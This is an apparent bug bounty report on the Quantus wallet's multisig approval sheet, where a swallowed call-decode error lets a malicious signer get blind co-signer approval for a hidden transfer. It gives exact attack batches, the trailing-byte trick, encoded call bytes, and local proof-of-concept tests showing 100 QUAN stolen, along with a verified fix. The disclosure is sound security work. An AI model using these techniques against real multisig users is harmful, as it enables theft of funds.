# 88667 w a high unhandled call decode failure in the multisig approval sheet leads to direct theft of user funds

**Submitted on Aug 14th 2026 at 12:31:16 UTC by @zealynx for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88667
* **Report Type:** Websites & Apps
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-apps/tree/audit-comp-ready/mobile-app>
* **Impacts:**
  * Direct theft of user funds
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions

## Description

## Brief/Intro

The Quantus mobile wallet asks a multisig signer to approve a proposal whose contents it was unable to read, without telling them. The approval sheet fetches the proposal's authoritative call bytes from chain storage, fails to decode them, silently falls back to labels supplied by the off-chain indexer, and leaves the confirm button enabled with no warning and no parameter list. A malicious member of an ordinary user multisig can exploit this to obtain an uninformed co-signer approval for a transfer the co-signer never saw, and on execution the multisig's funds move to an attacker-controlled address. In production this is direct theft of user funds from any multisig the attacker is a member of, requiring no privileged account, no leaked key, and no compromised infrastructure.

## Vulnerability Details

### The unhandled failure path

`MultisigActionConfirmSheet` has two distinct failure modes for the proposal's inner call and handles only one of them.

A **load** failure sets `_callBytesFailed`, which blocks confirmation and renders a warning:

```dart
// Never confirm an action whose call bytes were meant to load but did not.
final blocked = _submitting || _loadingCallBytes || _callBytesFailed;
```

A **decode** failure of successfully-loaded bytes sets nothing. It is caught while building the display and discarded to a debug log:

```dart
DecodedCall? get _decodedProposalCall {
  final bytes = _callBytes;
  if (bytes != null) {
    try {
      return CallDecoder.decodeBytes(bytes);
    } catch (e) {
      quantusPrint('${widget.logPrefix} could not decode stored proposal call: $e');
      // falls through
    }
  }
  return widget.proposal.decodedCall;   // indexer-supplied bytes, a different source
}
```

`_callBytesFailed` remains `false`, so `blocked` is `false` and the confirm button stays enabled. The stated intent in the code — *"Never confirm an action whose call bytes were meant to load but did not"* — is not enforced for this path.

Confirmation then submits `_callBytes`, the authoritative chain bytes, which the chain compares byte-for-byte against what it stored. The signer therefore approves the real call while the screen described a different source.

### Display and signature come from different sources

The fallback resolves to `MultisigProposal.decodedCall`, which decodes `callRaw` — bytes supplied by the off-chain indexer, not the chain. The model's own documentation states the boundary:

> Display only — an approval must resubmit the bytes from chain storage.

Every display field originates from the indexer record, and the declared transfer fields take priority over decoding the call at all:

```dart
BigInt parsedAmount = transferAmountRaw != null ? bigIntFromJson(transferAmountRaw) : BigInt.zero;
String recipient = nestedAccountId(record['transferTo'] ?? record['transfer_to']);
final callRaw = _callRawBytes(record['call_raw'] as String?);
pallet: _stringOrEmpty(record['pallet']),
call:   _stringOrEmpty(record['call']),
```

The chain bytes and the indexer bytes are never compared, and no call hash is rendered, so the signer has no manual path to detect the divergence.

### Trigger 1 — generated codec cannot decode six in-use pallets

The Dart `RuntimeCall` codec decodes pallet indices `0,1,2,7,9,11,13,14,15,16,17,19,20`. The runtime defines `0,1,2,3,5,6,7,8,9,11,13,14,15,16,19,20,21,22`. Six in-use pallets cannot be decoded — `3` TransactionPayment, `5` QPoW, `6` MiningRewards, `8` Scheduler, `21` ZkTree, `22` Vesting — and the codec additionally carries an index `17` the runtime no longer defines.

`Utility::batch` recursively decodes each item with that same codec, so a batch containing any of the six aborts decoding in the app while remaining fully valid on chain. `batch` preserves the effects of calls that precede an interrupted one, so a batch of `[Balances::transfer_allow_death(attacker, amount), <undecodable call>]` transfers the funds and then interrupts.

### Trigger 2 — chain and app disagree on trailing bytes

This trigger is independent of codec freshness and survives regenerating the bindings.

Both `propose` and `execute` validate the inner call with:

```rust
<T as Config>::RuntimeCall::decode(&mut &call[..])
```

That is `parity_scale_codec::Decode`: it reads from the front and never requires the input to be fully consumed. Neither path checks for a remainder. The mobile decoder does the opposite:

```dart
final remaining = input.remainingLength ?? 0;
if (remaining != 0) {
  throw FormatException('$remaining trailing bytes after nested call');
}
```

Appending one junk byte to an otherwise ordinary, fully decodable call therefore makes the chain accept, store and dispatch it normally while the app is guaranteed to fail decoding. This reaches the same undisclosed-approval state on any call, on any runtime, with no dependence on the generated bindings.

### What the approving signer sees

Stated precisely, because it bounds the claim. The sheet does not render a false benign transfer — it renders **nothing**: the indexer's `pallet` and `call` labels with no parameter list, no transfer summary, and no warning. `DecodedCallView` is skipped because the fallback carries `fields: const []`, and the `multisigProposalCallUnavailable` warning is gated on `_callBytesFailed`, which a decode failure never sets. `MultisigService` has already cleared recipient and amount when the authoritative bytes cannot be decoded, so those fields are absent from the proposal view as well.

The prompt is indistinguishable from a normally rendered proposal that simply has no displayable parameters. Nothing on this screen, or anywhere else in the app, discloses that the authoritative bytes could not be read.

## Impact Details

**Direct theft of user funds.** A malicious member of an ordinary user multisig obtains an uninformed co-signer approval and moves funds to an address they control.

* **Amount at risk:** attacker-chosen, bounded only by the multisig's balance. The proposed inner call is an ordinary `Balances::transfer_allow_death` whose value the attacker sets; the demonstrated case moves 100 QUAN from a 500-QUAN multisig.
* **Who bears the loss:** every signer of the multisig, proportionally to its holdings. The funds are gone on execution; nothing in the flow is reversible.
* **Attacker prerequisites:** membership of the target multisig and one deceived co-signer. No privileged origin, no Root or sudo, no leaked key, no compromised server, no runtime upgrade. At threshold 2-of-3 a single uninformed approval suffices; a threshold of N requires N−1.
* **Reachability:** the standard approval flow. The victim opens the proposal the way they open every other one and is shown an approvable prompt.
* **Persistence:** trigger 1 is live for six in-use pallets today; trigger 2 is structural and recurs on every future runtime for every call, so the exposure does not lapse with a metadata refresh.

This matches the selected in-scope impacts **"Direct theft of user funds"** and **"Malicious interactions with an already-connected wallet — Submitting malicious transactions"**: the victim's connected wallet submits a transaction whose arguments were withheld from them.

## References

Frozen revisions:

* Chain — `quantus-chain@3b243b870a5442a6e5f443056f67bbba87d472f5`
* Apps — `quantus-apps@d5fc4d6572ebc2244e95009a33f5da5048935867`

Affected code:

* `mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart` — decode failure caught and discarded; `blocked` omits it; `DecodedCallView` and the warning both suppressed
* `quantus_sdk/lib/generated/planck/types/quantus_runtime/runtime_call.dart` — generated codec missing six runtime pallet indices
* `quantus_sdk/lib/src/chain/call_decoder.dart#L52-L59` — strict trailing-byte rejection
* `quantus_sdk/lib/src/services/multisig_service.dart#L302-L320` — clears recipient and amount on undecodable bytes
* `quantus_sdk/lib/src/models/multisig_proposal.dart` — indexer-sourced display fields; `decodedCall` documented as display-only
* `pallets/multisig/src/lib.rs` — `propose` and `execute` non-strict `RuntimeCall::decode`
* `runtime/src/lib.rs` — `#[runtime::pallet_index(22)] pub type Vesting = pallet_vesting;`
* `pallets/utility/src/lib.rs` — `batch` preserves the effects of calls preceding an interruption

Specification:

* `parity_scale_codec::Decode` reads from the front of the input and does not require full consumption, which is the basis of trigger 2.

## Link to Proof of Concept

<https://gist.github.com/vendrell46/ee18c0a722970889b46fe373c7626266>

## Proof of Concept

## PoC

Frozen revisions:

* `quantus-chain@3b243b870a5442a6e5f443056f67bbba87d472f5`
* `quantus-apps@d5fc4d6572ebc2244e95009a33f5da5048935867`

### Environment and dependencies

Everything below runs locally. **No test was performed against mainnet or any public testnet.**

Chain half requires: a Rust toolchain matching the repo's `rust-toolchain`, and the environment variable `SKIP_WASM_BUILD=1` (native-only test build). No RPC endpoint, no fork, no external service. Tests are added to the existing `runtime/tests/governance/vesting.rs`, which already provides the `account()`, `signers()`, `treasury_multisig()` and `new_test_ext()` helpers used below.

Mobile half requires: Flutter stable (verified in `ghcr.io/cirruslabs/flutter:stable`), an empty `mobile-app/.env` file (`touch mobile-app/.env` — the project's own CI does the same), and `flutter pub get` in both `quantus_sdk/` and `mobile-app/`. The test uses the repository's existing `mobile-app/test/fakes.dart` helpers. No device or emulator is needed; it is a widget test.

### Step-by-step

{% stepper %}
{% step %}

## Create the multisig setup

The attacker is an ordinary signer of a 2-of-3 multisig holding funds. The victim is another ordinary signer. Neither is privileged; no key is leaked.
{% endstep %}

{% step %}

## Build the hidden transfer batch

The attacker builds `Utility::batch([Balances::transfer_allow_death(attacker, 100 QUAN), Vesting::claim(u64::MAX)])`.

The transfer is valid for the multisig origin. The trailing `Vesting` call exists only because it sits at runtime pallet index 22, which the mobile app's generated codec cannot decode.

*(Equivalent trigger, independent of the codec: take any ordinary valid call and append one junk byte — see the trailing-byte section below.)*
{% endstep %}

{% step %}

## Propose the call

The attacker calls `Multisig::propose(multisig, encoded_call, expiry)`. The chain decodes the call successfully — every pallet in it is real — and stores the exact bytes.
{% endstep %}

{% step %}

## Open the approval sheet

The victim opens the proposal in the app and reaches the approval sheet.

The sheet fetches the authoritative call bytes from chain storage. **This succeeds**, so `_callBytesFailed` stays `false`.
{% endstep %}

{% step %}

## Trigger the decode failure

`CallDecoder.decodeBytes` throws `Invalid variant index: "22"`. The exception is caught and written to a debug log only.

The sheet falls back to the indexer's labels and renders `Utility` / `batch` with **no parameter list, no recipient, no amount and no warning**. The confirm button is enabled, because `blocked` never consulted the decode result.
{% endstep %}

{% step %}

## Approve the undisclosed call

The victim confirms. The app submits the **chain bytes verbatim** through `Multisig::approve`, so the approval is byte-exact against what the chain stored and counts toward the threshold.
{% endstep %}

{% step %}

## Execute the batch

With the threshold met, any signer calls `Multisig::execute`.

The chain dispatches the batch. `Balances::transfer_allow_death` succeeds and moves 100 QUAN to the attacker. `Vesting::claim(u64::MAX)` then fails and interrupts the batch — but `Utility::batch` does not revert calls that already succeeded.
{% endstep %}

{% step %}

## Result

The multisig is down 100 QUAN, the attacker's address is up 100 QUAN, and the approving signer was never shown the transfer, its amount, or its recipient.
{% endstep %}
{% endstepper %}

### Chain half

Apply this patch:

```diff
diff --git a/runtime/tests/governance/vesting.rs b/runtime/tests/governance/vesting.rs
index 4da000f..906c4ab 100644
--- a/runtime/tests/governance/vesting.rs
+++ b/runtime/tests/governance/vesting.rs
@@ -12,11 +12,11 @@ mod tests {
 		configs::{
 			VestingMinClaimInterval, VestingMinimumPayout, VestingPayoutQuantum, VolumeFeeRateBps,
 		},
-		AccountId, Balance, Balances, Multisig, Runtime, RuntimeCall, RuntimeEvent, RuntimeOrigin,
-		System, Vesting, Wormhole, EXISTENTIAL_DEPOSIT, UNIT,
+		AccountId, Balance, Balances, BalancesCall, Multisig, Runtime, RuntimeCall, RuntimeEvent,
+		RuntimeOrigin, System, Vesting, Wormhole, EXISTENTIAL_DEPOSIT, UNIT,
 	};
 	use sp_core::crypto::AccountId32;
-	use sp_runtime::{BuildStorage, DispatchError, Permill};
+	use sp_runtime::{BuildStorage, DispatchError, MultiAddress, Permill};
 
 	const END_MS: u64 = 1_000_000;
 	const GRANT: Balance = 100 * UNIT;
@@ -91,6 +91,64 @@ mod tests {
 		assert_eq!(VestingMinClaimInterval::get(), 24 * 60 * 60 * 1000);
 	}
 
+	#[test]
+	fn poc_unknown_nested_call_hides_and_executes_ordinary_multisig_transfer() {
+		new_test_ext(None).execute_with(|| {
+			let attacker = account(1);
+			let victim_approver = account(2);
+			let executor = account(3);
+			let recipient = account(7);
+			let multisig = treasury_multisig();
+			let stolen = 100 * UNIT;
+
+			assert_ok!(Multisig::create_multisig(
+				RuntimeOrigin::signed(attacker.clone()),
+				signers(),
+				2,
+				0,
+			));
+			Balances::make_free_balance_be(&multisig, 500 * UNIT);
+
+			// `Utility::batch` keeps effects of calls before an interrupted call. The
+			// transfer is valid for the ordinary multisig origin; the trailing Vesting
+			// call is only present to make the stale mobile RuntimeCall codec abort.
+			let hidden_call = RuntimeCall::Utility(pallet_utility::Call::batch {
+				calls: vec![
+					RuntimeCall::Balances(BalancesCall::transfer_allow_death {
+						dest: MultiAddress::Id(recipient.clone()),
+						value: stolen,
+					}),
+					RuntimeCall::Vesting(pallet_vesting::Call::claim { schedule_id: u64::MAX }),
+				],
+			});
+			let encoded = hidden_call.encode();
+			println!("HIDDEN_ORDINARY_MULTISIG_CALL_BYTES={encoded:?}");
+			assert_eq!(encoded[0], 9, "outer call must be Utility");
+			assert!(encoded.windows(2).any(|window| window == [22, 0]));
+
+			let bounded: BoundedCallOf<Runtime> = encoded.clone().try_into().unwrap();
+			assert_ok!(Multisig::propose(
+				RuntimeOrigin::signed(attacker),
+				multisig.clone(),
+				bounded.clone(),
+				System::block_number() + 100,
+			));
+			assert_ok!(Multisig::approve(
+				RuntimeOrigin::signed(victim_approver),
+				multisig.clone(),
+				0,
+				bounded,
+			));
+
+			let multisig_before = Balances::total_balance(&multisig);
+			let recipient_before = Balances::total_balance(&recipient);
+			assert_ok!(Multisig::execute(RuntimeOrigin::signed(executor), multisig.clone(), 0));
+
+			assert_eq!(Balances::total_balance(&recipient), recipient_before + stolen);
+			assert_eq!(Balances::total_balance(&multisig), multisig_before - stolen);
+		});
+	}
+
 	#[test]
 	fn treasury_multisig_creates_and_ends_schedules() {
 		new_test_ext(Some(treasury_multisig())).execute_with(|| {
```

Run:

```bash
cargo test -p quantus-runtime poc_unknown_nested_call_hides_and_executes_ordinary_multisig_transfer -- --nocapture
```

The test creates and funds an ordinary two-of-three multisig, proposes and approves the nested call with ordinary signers, executes it, and asserts the 100 QUAN loss and recipient gain.

Observed output:

```
HIDDEN_ORDINARY_MULTISIG_CALL_BYTES=[9, 0, 8, 2, 0, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 0, 64, 122, 16, 243, 90, 22, 0, 255, 255, 255, 255, 255, 255, 255, 255]
test governance::vesting::tests::poc_unknown_nested_call_hides_and_executes_ordinary_multisig_transfer ... ok
test result: ok. 1 passed; 0 failed
```

Baseline:

```bash
cargo test -p quantus-runtime treasury_multisig_creates_and_ends_schedules
```

```
test governance::vesting::tests::treasury_multisig_creates_and_ends_schedules ... ok
test result: ok. 1 passed; 0 failed
```

### Chain half — trailing-byte trigger

Independent of the stale bindings. Same frozen revision. Add to `runtime/tests/governance/vesting.rs`:

```rust
#[test]
fn audit_trailing_bytes_call_is_accepted_and_dispatched() {
    use codec::Encode;
    new_test_ext(None).execute_with(|| {
        let attacker = account(1);
        let approver = account(2);
        let recipient = account(7);
        let multisig = treasury_multisig();
        let stolen: Balance = 100 * UNIT;

        assert_ok!(Multisig::create_multisig(
            RuntimeOrigin::signed(attacker.clone()), signers(), 2, 0,
        ));
        Balances::make_free_balance_be(&multisig, 500 * UNIT);
        let before = Balances::total_balance(&recipient);

        // An ordinary, fully decodable transfer.
        let inner = RuntimeCall::Balances(pallet_balances::Call::transfer_keep_alive {
            dest: sp_runtime::MultiAddress::Id(recipient.clone()),
            value: stolen,
        });

        // Control: clean bytes are fully consumed.
        let clean = inner.encode();
        let mut cursor = &clean[..];
        assert!(RuntimeCall::decode(&mut cursor).is_ok());
        assert_eq!(cursor.len(), 0);

        // Attack: same call plus one junk byte still decodes, with a remainder.
        let mut poisoned = clean.clone();
        poisoned.push(0xFF);
        let mut cursor2 = &poisoned[..];
        assert!(RuntimeCall::decode(&mut cursor2).is_ok());
        assert_eq!(cursor2.len(), 1, "chain silently ignores the trailing byte");

        let bounded: BoundedVec<u8, <Runtime as pallet_multisig::Config>::MaxCallSize> =
            poisoned.clone().try_into().expect("call fits MaxCallSize");

        assert_ok!(Multisig::propose(
            RuntimeOrigin::signed(attacker.clone()), multisig.clone(), bounded.clone(), 1_000u32.into(),
        ));
        assert_ok!(Multisig::approve(
            RuntimeOrigin::signed(approver.clone()), multisig.clone(), 0, bounded.clone(),
        ));
        assert_ok!(Multisig::execute(RuntimeOrigin::signed(approver.clone()), multisig.clone(), 0));

        assert_eq!(Balances::total_balance(&recipient) - before, stolen);
    });
}
```

Run:

```bash
SKIP_WASM_BUILD=1 cargo test -p quantus-runtime --test mod \
  governance::vesting::tests::audit_trailing_bytes_call_is_accepted_and_dispatched -- --nocapture
```

Observed output:

```
AUDIT: trailing-byte call dispatched; recipient +100000000000000
test governance::vesting::tests::audit_trailing_bytes_call_is_accepted_and_dispatched ... ok
test result: ok. 1 passed; 0 failed
```

The control and the attack assert in the same test: a clean encoding leaves no remainder, the poisoned encoding leaves one byte and is still proposed, approved and dispatched in full.

### Mobile half

Create `mobile-app/test/unit/multisig_nested_unknown_blind_approval_test.dart` with:

```dart
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_test/flutter_test.dart';
import 'package:quantus_sdk/quantus_sdk.dart';
import 'package:resonance_network_wallet/l10n/app_localizations.dart';
import 'package:resonance_network_wallet/v2/components/decoded_call_view.dart';
import 'package:resonance_network_wallet/v2/components/quantus_button.dart';
import 'package:resonance_network_wallet/v2/screens/multisig/multisig_action_confirm_sheet.dart';
import 'package:resonance_network_wallet/v2/theme/app_theme.dart';
import 'package:shared_preferences/shared_preferences.dart';

import '../fakes.dart';

final Uint8List hiddenTransferBatch = Uint8List.fromList([
  9, 0, 8, 2, 0, 0, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 11, 0, 64, 122, 16,
  243, 90, 22, 0, 255, 255, 255, 255, 255, 255, 255, 255,
]);

MultisigProposal hiddenProposal() => MultisigProposal(
  entityId: 'proposal-hidden-transfer',
  id: 0,
  multisigAddress: makeMultisigAccount().accountId,
  proposer: makeAccount(1).accountId,
  createdAt: DateTime.utc(2026, 1, 1),
  updatedAt: DateTime.utc(2026, 1, 1),
  pallet: 'Utility',
  call: 'batch',
  recipient: '',
  amount: BigInt.zero,
  callRaw: hiddenTransferBatch,
  expiryBlock: 1000,
  approvals: const [],
  deposit: BigInt.from(1000000000),
  status: MultisigProposalStatus.active,
  threshold: 2,
  signerCount: 3,
);

const labels = MultisigConfirmSheetLabels(
  title: title,
  body: body,
  confirmLabel: confirmLabel,
  dismissLabel: dismissLabel,
  authReason: authReason,
  failedMessage: failedMessage,
);

String title(AppLocalizations l10n) => l10n.multisigApproveConfirmTitle;
String body(AppLocalizations l10n) => l10n.multisigApproveConfirmBody;
String confirmLabel(AppLocalizations l10n) => l10n.multisigApproveConfirmYes;
String dismissLabel(AppLocalizations l10n) => l10n.multisigApproveConfirmNo;
String authReason(AppLocalizations l10n) => l10n.multisigApproveAuthReason;
String failedMessage(AppLocalizations l10n) => l10n.multisigApproveFailed;

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  setUp(() async {
    SharedPreferences.setMockInitialValues({});
    await SettingsService().initialize();
  });

  testWidgets('HARM: exact executable batch hides transfer and remains approvable', (tester) async {
    expect(
      () => CallDecoder.decodeBytes(hiddenTransferBatch),
      throwsA(isA<Exception>()),
      reason: 'the frozen mobile metadata unexpectedly learned runtime pallet 22',
    );

    await tester.pumpWidget(
      ProviderScope(
        child: MediaQuery(
          data: const MediaQueryData(size: Size(800, 1200)),
          child: Builder(
            builder: (context) => MaterialApp(
              theme: AppTheme.darkTheme(context),
              localizationsDelegates: AppLocalizations.localizationsDelegates,
              supportedLocales: AppLocalizations.supportedLocales,
              home: Scaffold(
                body: SingleChildScrollView(
                  child: MultisigActionConfirmSheet(
                    msig: makeMultisigAccount(),
                    proposal: hiddenProposal(),
                    signer: makeAccount(2),
                    labels: labels,
                    logPrefix: '[NestedUnknownPoC]',
                    hardwareTelemetryPrefix: 'nested_unknown_poc',
                    hardwareCacheIdentity: 'approve|nested-unknown|0',
                    loadCallBytes: (ref) async => hiddenTransferBatch,
                    estimateFee: (ref, signer, callBytes) async => BigInt.from(1000000000),
                    submit: (ref, signer, fee, callBytes) async {},
                    buildCall: (signer, callBytes) => throw StateError('not reached'),
                    submitExternal:
                        (
                          ref, {
                          required signer,
                          required unsignedData,
                          required signature,
                          required publicKey,
                          fee,
                        }) async => '0xdeadbeef',
                  ),
                ),
              ),
            ),
          ),
        ),
      ),
    );
    await tester.pumpAndSettle();

    final l10n = await AppLocalizations.delegate.load(const Locale('en'));
    expect(
      find.text(l10n.multisigProposalCallUnavailable),
      findsNothing,
      reason: 'HARM NOT REPRODUCED: decode failure was disclosed',
    );
    expect(
      find.byType(DecodedCallView),
      findsNothing,
      reason: 'HARM NOT REPRODUCED: recipient and amount were displayed',
    );

    final confirm = tester.widget<QuantusButton>(
      find.widgetWithText(QuantusButton, l10n.multisigApproveConfirmYes),
    );
    expect(confirm.isDisabled, isFalse, reason: 'HARM NOT REPRODUCED: blind approval was blocked');
  });
}
```

Then run:

```bash
touch mobile-app/.env
cd mobile-app
flutter test test/unit/multisig_nested_unknown_blind_approval_test.dart --reporter expanded
```

Observed output:

```
HARM: exact executable batch hides transfer and remains approvable
[NestedUnknownPoC] could not decode stored proposal call: Exception: RuntimeCall: Invalid variant index: "22"
All tests passed!
```

The exact bytes printed by the chain test are the bytes loaded by the widget test. The test asserts that no warning or decoded parameter tree is shown and that approval remains enabled.

### Fix verified

Apply:

```diff
diff --git a/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart b/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart
index 18b6ca0..d8b95ff 100644
--- a/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart
+++ b/mobile-app/lib/v2/screens/multisig/multisig_action_confirm_sheet.dart
@@ -144,6 +144,7 @@ class _MultisigActionConfirmSheetState extends ConsumerState<MultisigActionConfi
 
   /// The proposal's inner call as stored on chain, for actions that resubmit it.
   List<int>? _callBytes;
+  DecodedCall? _decodedCallBytes;
   bool _loadingCallBytes = false;
   bool _callBytesFailed = false;
 
@@ -162,8 +163,21 @@ class _MultisigActionConfirmSheetState extends ConsumerState<MultisigActionConfi
       try {
         final bytes = await loader(ref);
         if (!mounted) return;
+        late final DecodedCall decoded;
+        try {
+          decoded = CallDecoder.decodeBytes(bytes);
+        } catch (e, st) {
+          quantusPrint('${widget.logPrefix} proposal call decode error: $e $st');
+          setState(() {
+            _loadingCallBytes = false;
+            _callBytesFailed = true;
+            _loadingFee = false;
+          });
+          return;
+        }
         setState(() {
           _callBytes = bytes;
+          _decodedCallBytes = decoded;
           _loadingCallBytes = false;
         });
       } catch (e, st) {
@@ -183,14 +197,7 @@ class _MultisigActionConfirmSheetState extends ConsumerState<MultisigActionConfi
   /// The proposal's call as a display tree: from the authoritative chain bytes
   /// when loaded, otherwise from the indexer's copy.
   DecodedCall? get _decodedProposalCall {
-    final bytes = _callBytes;
-    if (bytes != null) {
-      try {
-        return CallDecoder.decodeBytes(bytes);
-      } catch (e) {
-        quantusPrint('${widget.logPrefix} could not decode stored proposal call: $e');
-      }
-    }
+    if (_callBytes != null) return _decodedCallBytes;
     return widget.proposal.decodedCall;
   }
```

Re-run the unchanged mobile PoC. It fails at the harm assertion because the decode warning is now rendered and approval is disabled:

```
Expected: no matching candidates
Actual: Found 1 widget with text "Could not read this proposal from the chain..."
HARM NOT REPRODUCED: decode failure was disclosed
```

A sweep over all four current Vesting variants then passes, and a supported Balances transfer still renders its parameters and remains confirmable.
